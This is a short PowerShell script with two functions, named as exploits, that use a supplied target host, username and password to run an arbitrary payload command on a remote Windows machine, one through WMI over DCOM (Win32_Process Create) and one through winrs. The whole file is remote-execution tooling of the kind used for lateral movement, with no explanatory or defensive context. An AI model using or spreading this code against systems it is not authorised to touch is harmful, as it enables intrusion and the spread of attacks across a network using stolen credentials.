function invoke-WMIExploit {
    param (
        [Parameter(Mandatory = $true)]
        [string]$target,

        [Parameter(Mandatory = $true)]
        [string]$username,

        [Parameter(Mandatory = $true)]
        [string]$password,

        [Parameter(Mandatory = $true)]
        [string]$payload
    )

    $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
    $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

    $options = New-CimSessionOption -Protocol DCOM
    $session = New-Cimsession -ComputerName $target -Credential $credential -SessionOption $Options 
    $command = $payload;

    Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command };
}

function invoke-WinRMExploit {
    param (
        [Parameter(Mandatory = $true)]
        [string]$target,

        [Parameter(Mandatory = $true)]
        [string]$username,

        [Parameter(Mandatory = $true)]
        [string]$password,

        [Parameter(Mandatory = $true)]
        [string]$payload
    )

    winrs -r:$target -u:$username -p:$password $payload
}
